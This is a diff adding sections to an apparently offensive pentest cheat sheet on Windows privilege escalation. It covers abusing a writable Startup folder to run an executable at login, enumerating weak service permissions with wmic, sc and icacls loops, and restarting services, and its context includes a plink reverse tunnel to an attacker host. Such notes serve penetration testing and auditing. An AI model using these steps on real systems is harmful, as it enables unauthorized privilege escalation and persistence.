@@ -127,6 +127,16 @@ msbuild [src.sln]
 pyinstaller yourprogram.py
 ```
 
+### Startup Application
+
+If you can run programs at startup, the next time someone logs in; you could get a shell before they know what's happening. Run the following and look for `BUILTIN\Users` if they have `(F)` or `(C)` it is vulnerable.
+
+```bash
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+Simply put an exe in here to have it execute on startup.
+
 ### Always Install Elevated
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
@@ -172,12 +182,54 @@ plink.exe -l $LUSER -pw $LPASS $LHOST -R $LPORT:127.0.0.1:$RPORT
 ```
 
 ### Vulnerable Scheduled Tasks
+
 ```bash
 # Victim
 schtasks /query /fo LIST /v > schtask.txt
 
 # Attacker
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+```
+
+### Weak Service Permissions
+
+Thanks to [sushant747] for the following scripts.
+
+#### Using WMCI
+
+```bash
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+```
+#### sc.exe
+
+```bash
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+
+Then go through it manually with:
+
+```bash
+cacls "C:\path\to\file.exe"
+```
+
+### Restarting a Service
+
+```bash
+wmic service [service name] call startservice
+
+# OR
+
+net stop [service name] && net start [service name].
+
 ```
 
 ## Linux Privilege Escalation
